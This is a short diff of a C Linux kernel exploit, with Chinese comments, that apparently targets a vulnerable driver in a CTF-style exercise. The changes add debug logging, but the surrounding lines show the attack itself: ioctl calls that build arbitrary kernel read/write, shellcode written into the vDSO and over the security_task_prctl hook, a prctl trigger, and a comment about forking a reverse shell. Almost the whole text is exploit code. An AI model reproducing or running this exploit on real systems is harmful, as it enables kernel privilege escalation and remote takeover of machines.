@@ -144,7 +144,7 @@ if(fd < 0)
 printf("open fail\n"); 
 exit(1); 
 } 
-
+ioctl(fd,INIT_KLOG,NULL);
 // 构造任意地址读写
 i_args.size=0x100;
 ioctl(fd, ARBITRARY_RW_INIT, &i_args);
@@ -188,7 +188,7 @@ size_t VDSO_SIZE=0x1000;
 vdso_patch[0].patch = shellcode;
 vdso_patch[0].size = sizeof(shellcode);
 vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - sizeof(shellcode);
-printf("vdso shellode address:0x%p , shellcode len:0x%d",vdso_patch[0].addr,sizeof(shellcode));
+printf("vdso shellode address:0x%p , shellcode len:0x%d \n",vdso_patch[0].addr,sizeof(shellcode));
 //write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));
 
 
@@ -197,7 +197,8 @@ memset(buf,'\x00',0x1000);
 *(size_t *)buf = set_memory_x_addr;
 //write_mem(fd,security_task_prctl_hook, buf, 8);
 write_mem(fd,security_task_prctl_hook, shellcode,sizeof(shellcode));
-printf("shellcode :%p",shellcode);
+get_log(fd);
+printf("shellcode :%p \n",shellcode);
 sleep(5);
 prctl(vdso_addr,1,NULL,NULL,NULL);
 //需要fork()子线程来执行reverse_shell程序
